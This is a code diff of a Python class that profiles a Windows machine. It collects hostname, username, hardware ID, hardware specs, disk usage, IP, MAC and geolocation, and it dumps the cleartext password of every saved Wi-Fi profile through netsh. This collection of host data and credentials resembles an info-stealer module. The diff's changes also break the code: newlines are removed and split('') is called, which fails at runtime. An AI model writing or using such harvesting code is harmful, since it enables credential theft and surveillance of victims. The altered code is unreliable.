@@ -28,12 +28,12 @@ class SystemInfo():
         hostname = os.getenv('COMPUTERNAME')
         username = os.getenv('USERNAME')
 
-        return f"Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}"
+        return f"Display Name: {display_name}Hostname: {hostname}Username: {username}"
 
     def system_data(self):
         def get_hwid() -> str:
             hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
-                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('')[1].strip()
 
             return hwid
 
@@ -43,18 +43,18 @@ class SystemInfo():
                     0].TotalVisibleMemorySize) / 1048576, 0)
         hwid = get_hwid()
 
-        return f"CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}"
+        return f"CPU: {cpu}GPU: {gpu}RAM: {ram}HWID: {hwid}"
     
     import os
     import psutil
 
     def disk_data(self):
-        disk = ("{:<9} "*4).format("Mountpoint", "Free", "Total", "Use%") + "\n"
+        disk = ("{:<9} "*4).format("Mountpoint", "Free", "Total", "Use%") + ""
         for part in psutil.disk_partitions(all=False):
             if os.name == 'nt' or os.name == 'posix':
                 usage = psutil.disk_usage(part.mountpoint)
                 disk += ("{:<9} "*4).format(part.mountpoint, str(
-                    usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
+                    usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + ""
 
         return f"{disk}"
             
@@ -71,7 +71,7 @@ class SystemInfo():
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         country, region, city, zip_, as_ = geolocation(ip)
 
-        return f"IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}".format(
+        return f"IP Address: {ip}MAC Address: {mac}Country: {country}Region: {region}City: {city} ({zip_})ISP: {as_}".format(
                 ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_)
 
     def wifi_data(self):
@@ -79,7 +79,7 @@ class SystemInfo():
         try:
             wifi = subprocess.check_output(
                 ['netsh', 'wlan', 'show', 'profiles'], shell=True,
-                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
+                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('')
             wifi = [i.split(":")[1][1:-1]
                     for i in wifi if "All User Profile" in i]
 
@@ -87,7 +87,7 @@ class SystemInfo():
                 try:
                     results = subprocess.check_output(
                         ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
-                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
+                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('')
                     results = [b.split(":")[1][1:-1]
                                for b in results if "Key Content" in b]
                 except subprocess.CalledProcessError:
@@ -102,10 +102,10 @@ class SystemInfo():
         except subprocess.CalledProcessError:
             pass
 
-        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
-        out += f'{"-"*20}|{"-"*29}\n'
+        out += f'{"SSID":<20}| {"PASSWORD":<}'
+        out += f'{"-"*20}|{"-"*29}'
         for name, password in networks:
-            out += '{:<20}| {:<}\n'.format(name, password)
+            out += '{:<20}| {:<}'.format(name, password)
 
         return f"{out}"  
 
